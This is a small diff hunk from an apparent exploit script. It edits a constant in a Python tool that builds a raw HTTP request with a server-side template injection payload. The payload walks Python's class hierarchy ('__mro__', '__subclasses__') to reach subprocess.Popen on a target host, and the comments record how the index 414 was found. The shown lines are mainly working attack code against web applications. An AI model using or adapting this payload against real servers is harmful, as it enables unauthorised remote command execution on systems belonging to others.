@@ -38,7 +38,7 @@ def cmd(s):
 
 #Debugging previous request with: ''.__class__.__mro__[1].__subclasses__()
 #Shows index 414 is the subprocess.Popen() class/method
-SUBPROCESS_INDEX = 414
+SUBPROCESS_INDEX = '414'
 http_req = """GET /{{{{''.__class__.__mro__[1].__subclasses__()[{index}]{args}}}}} HTTP/1.1\r
 Host: {targhost}:{targport}\r
 Upgrade-Insecure-Requests: 1\r
